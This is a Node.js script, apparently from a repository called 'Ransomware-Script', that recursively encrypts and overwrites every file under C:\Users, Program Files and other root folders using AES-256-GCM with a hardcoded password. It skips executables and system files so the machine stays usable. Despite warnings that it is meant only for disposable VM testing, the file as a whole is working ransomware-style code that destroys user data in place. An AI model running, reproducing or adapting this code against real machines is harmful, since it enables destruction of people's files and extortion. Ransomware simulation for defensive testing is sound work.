// encrypt-c-root-folders.js
// IN-PLACE multi-folder encryptor for testing in a VM.
// WARNING: This will overwrite original files. Use only in a disposable VM/snapshot.
//
// GitHub: https://github.com/hackervegas001/Ransomware-Script
//
// Note: the URL above is also embedded as a string constant below so it appears
// in the packaged .exe (searchable with `strings`).

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

/// ======== CONFIG - EDIT BEFORE RUNNING =========
// Change these before running:
const PASSWORD = 'root1234'; // <-- set a strong password here
const TARGET_DIRS = [
  'C:\\.onecontext',
  'C:\\PerfLogs',
  'C:\\Program Files',
  'C:\\Program Files (x86)',
  'C:\\Users'
//  'C:\\inetpub',
//  'C:\\PerfLogs',
//  'C:\\RanSim',
//  'C:\\$WinREAgent'
];
// optional: file extensions to skip (lowercase)
const SKIP_EXTENSIONS = [
  '.exe', '.dll', '.sys', '.efi', '.msi', '.bat', '.cmd', '.lnk', '.drv'
];
const SKIP_FILENAMES = [ 'pagefile.sys', 'hiberfil.sys' ]; // explicit filenames to skip
/// ================================================

// Embedded GitHub URL (string constant)
// This is intentionally referenced below so packaging tools keep it in the binary.
const __GITHUB_URL = 'https://github.com/hackervegas001/Ransomware-Script';
// harmless reference so bundlers don't drop the string
try { process.env.__GH = __GITHUB_URL; } catch (e) { /* ignore */ }

const ALGO = 'aes-256-gcm';
const SALT_LEN = 16;
const IV_LEN = 12;
const TAG_LEN = 16;
const MAGIC = Buffer.from('FCGCM1'); // 6 bytes

function deriveKey(password, salt) {
  return crypto.scryptSync(password, salt, 32);
}

function readHeaderBytes(filePath, length) {
  const fd = fs.openSync(filePath, 'r');
  try {
    const buf = Buffer.alloc(length);
    const bytesRead = fs.readSync(fd, buf, 0, length, 0);
    return buf.slice(0, bytesRead);
  } finally {
    fs.closeSync(fd);
  }
}

function isAlreadyEncryptedFile(filePath) {
  try {
    const head = readHeaderBytes(filePath, MAGIC.length);
    return head.length === MAGIC.length && head.equals(MAGIC);
  } catch (e) {
    return false;
  }
}

function shouldSkipFile(filePath) {
  const name = path.basename(filePath).toLowerCase();
  if (SKIP_FILENAMES.includes(name)) return true;
  const ext = path.extname(name);
  if (ext && SKIP_EXTENSIONS.includes(ext.toLowerCase())) return true;
  return false;
}

function encryptAndOverwrite(filePath) {
  try {
    const stat = fs.statSync(filePath);
    if (!stat.isFile()) return;

    if (shouldSkipFile(filePath)) {
      console.log(`[SKIP] by extension/filename: ${filePath}`);
      return;
    }

    if (isAlreadyEncryptedFile(filePath)) {
      console.log(`[SKIP] already encrypted: ${filePath}`);
      return;
    }

    const data = fs.readFileSync(filePath);
    const salt = crypto.randomBytes(SALT_LEN);
    const key = deriveKey(PASSWORD, salt);
    const iv = crypto.randomBytes(IV_LEN);
    const cipher = crypto.createCipheriv(ALGO, key, iv);
    const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
    const tag = cipher.getAuthTag();

    const out = Buffer.concat([MAGIC, salt, iv, tag, encrypted]);

    const tmp = filePath + '.tmp_enc';
    fs.writeFileSync(tmp, out);
    fs.renameSync(tmp, filePath); // atomic-ish overwrite

    console.log(`[OK] Encrypted: ${filePath}`);
  } catch (err) {
    console.error(`[ERR] Failed to encrypt ${filePath}: ${err.message}`);
  }
}

function walkAndEncrypt(dir) {
  let items;
  try {
    items = fs.readdirSync(dir);
  } catch (e) {
    console.warn(`[WARN] Cannot read directory (permissions?): ${dir} : ${e.message}`);
    return;
  }

  for (const it of items) {
    const full = path.join(dir, it);
    let s;
    try {
      s = fs.statSync(full);
    } catch (e) {
      console.warn(`[WARN] Cannot stat ${full}: ${e.message}`);
      continue;
    }
    if (s.isDirectory()) {
      // avoid following reparse points / junctions that point outside C: to reduce surprises
      try {
        walkAndEncrypt(full);
      } catch (e) {
        console.warn(`[WARN] error walking ${full}: ${e.message}`);
      }
    } else if (s.isFile()) {
      encryptAndOverwrite(full);
    }
  }
}

// sanity checks
if (!PASSWORD || PASSWORD.length < 6) {
  console.error('[-] PASSWORD is empty or too short. Edit script and set PASSWORD.');
  process.exit(1);
}

const existingTargets = TARGET_DIRS.filter(d => {
  try { return fs.existsSync(d) && fs.statSync(d).isDirectory(); } catch (e) { return false; }
});

if (existingTargets.length === 0) {
  console.error('[-] None of the configured TARGET_DIRS exist on this machine. Edit TARGET_DIRS.');
  process.exit(1);
}

console.log('*** MULTI-FOLDER IN-PLACE ENCRYPTION (VM TEST ONLY) ***');
console.log('Targets:');
existingTargets.forEach(d => console.log('  -', d));
console.log('SKIP_EXTENSIONS:', SKIP_EXTENSIONS.join(', '));
console.log('Make sure this is a disposable VM snapshot. Press Ctrl+C within 5 seconds to abort...');

setTimeout(() => {
  for (const dir of existingTargets) {
    console.log(`\n--- Processing: ${dir} ---`);
    try {
      walkAndEncrypt(dir);
    } catch (e) {
      console.error(`[ERR] Error processing ${dir}: ${e.message}`);
    }
  }
  console.log('\n*** ENCRYPTION RUN COMPLETE ***');
  // show the embedded GitHub URL at the end so human users seeing console output can confirm
  try { console.log('Repo:', process.env.__GH || __GITHUB_URL); } catch (e) {}
}, 5000);
